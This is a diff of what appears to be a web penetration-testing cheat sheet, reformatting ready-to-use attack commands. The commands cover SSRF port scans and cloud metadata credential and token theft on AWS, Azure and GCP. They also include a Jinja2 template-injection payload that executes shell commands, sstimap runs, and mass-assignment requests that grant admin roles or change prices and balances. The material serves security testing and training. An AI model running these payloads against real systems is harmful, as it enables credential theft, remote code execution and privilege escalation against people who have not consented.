@@ -44,15 +44,12 @@ curl -s "http://<target>/fetch?url=http://192.168.1.1/"   # internal gateway
 
 # Internal port scan via SSRF + response size/time differences
 for port in 22 25 80 443 3306 5432 6379 8080 8443 27017; do
-  size=$(curl -so /dev/null -w "%{size_download}" --max-time 3 \
-    "http://<target>/fetch?url=http://127.0.0.1:$port/")
+  size=$(curl -so /dev/null -w "%{size_download}" --max-time 3 "http://<target>/fetch?url=http://127.0.0.1:$port/")
   echo "Port $port: $size bytes"
 done
 
 # ffuf for port scan
-ffuf -w <(seq 1 65535 | tr '\n' '\n') \
-  -u "http://<target>/fetch?url=http://127.0.0.1:FUZZ/" \
-  -fs 0 -mc all -t 50
+ffuf -w <(seq 1 65535 | tr '\n' '\n') -u "http://<target>/fetch?url=http://127.0.0.1:FUZZ/" -fs 0 -mc all -t 50
 ```
 
 ### Cloud Metadata
@@ -67,18 +64,15 @@ curl -s "http://<target>/fetch?url=http://169.254.169.254/latest/user-data"
 
 # AWS IMDSv2 (requires token — try v1 first)
 # Step 1: get token (may not work via SSRF)
-curl -s "http://<target>/fetch?url=http://169.254.169.254/latest/api/token" \
-  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
+curl -s "http://<target>/fetch?url=http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
 # Alternate: try via Gopher (see below)
 
 # Azure IMDS
-curl -s "http://<target>/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
-  -H "Metadata: true"
+curl -s "http://<target>/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"
 curl -s "http://<target>/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
 
 # GCP metadata
-curl -s "http://<target>/fetch?url=http://metadata.google.internal/computeMetadata/v1/" \
-  -H "Metadata-Flavor: Google"
+curl -s "http://<target>/fetch?url=http://metadata.google.internal/computeMetadata/v1/" -H "Metadata-Flavor: Google"
 curl -s "http://<target>/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
 # Note: headers may not be passable via SSRF — try without them first
 ```
@@ -220,8 +214,7 @@ curl -s "http://<target>/page?name={{7*'7'}}"     # Jinja2 → 7777777, Twig →
 
 # URL-encode for GET parameters:
 # %7B%7Bcycler.__init__.__globals__.os.popen(%27id%27).read()%7D%7D
-curl -s --data-urlencode "name={{cycler.__init__.__globals__.os.popen('id').read()}}" \
-  "http://<target>/greet"
+curl -s --data-urlencode "name={{cycler.__init__.__globals__.os.popen('id').read()}}" "http://<target>/greet"
 ```
 
 ### Twig (PHP — Symfony)
@@ -291,8 +284,7 @@ python3 sstimap.py -u "http://<target>/page?name=*" -c "id"
 python3 sstimap.py -u "http://<target>/greet" -d "name=*"
 
 # With cookies
-python3 sstimap.py -u "http://<target>/page?name=*" \
-  -c "id" --cookie "session=<value>"
+python3 sstimap.py -u "http://<target>/page?name=*" -c "id" --cookie "session=<value>"
 ```
 
 ---
@@ -312,24 +304,15 @@ Frameworks that auto-bind request parameters to object properties may allow sett
 # Try submitting isAdmin/role in the registration request
 
 # Test fields from API responses that the form doesn't expose
-curl -s -X POST "http://<target>/api/register" \
-  -H "Content-Type: application/json" \
-  -d '{"username":"attacker","password":"P@ssw0rd","role":"admin"}'
+curl -s -X POST "http://<target>/api/register" -H "Content-Type: application/json" -d '{"username":"attacker","password":"P@ssw0rd","role":"admin"}'
 
-curl -s -X POST "http://<target>/api/register" \
-  -H "Content-Type: application/json" \
-  -d '{"username":"attacker","password":"P@ssw0rd","isAdmin":true}'
+curl -s -X POST "http://<target>/api/register" -H "Content-Type: application/json" -d '{"username":"attacker","password":"P@ssw0rd","isAdmin":true}'
 
 # Profile update — escalate role
-curl -s -X PUT "http://<target>/api/profile" \
-  -H "Authorization: Bearer <token>" \
-  -H "Content-Type: application/json" \
-  -d '{"username":"user","email":"x@x.com","role":"admin","balance":999999}'
+curl -s -X PUT "http://<target>/api/profile" -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -d '{"username":"user","email":"x@x.com","role":"admin","balance":999999}'
 
 # Check JSON vs form body — frameworks may handle differently
-curl -s -X POST "http://<target>/checkout" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "product_id=1&qty=1&price=0.01"
+curl -s -X POST "http://<target>/checkout" -H "Content-Type: application/x-www-form-urlencoded" -d "product_id=1&qty=1&price=0.01"
 ```
 
 ### Framework-Specific Notes
@@ -442,9 +425,7 @@ done
 
 # Mass assignment — inject extra fields
 # Register with role:
-curl -s -X POST "http://<target>/api/register" \
-  -H "Content-Type: application/json" \
-  -d '{"username":"x","password":"y","role":"admin","isAdmin":true}'
+curl -s -X POST "http://<target>/api/register" -H "Content-Type: application/json" -d '{"username":"x","password":"y","role":"admin","isAdmin":true}'
 
 # Open redirect check
 curl -sv "http://<target>/redirect?url=https://example.com" 2>&1 | grep -i "^< location"
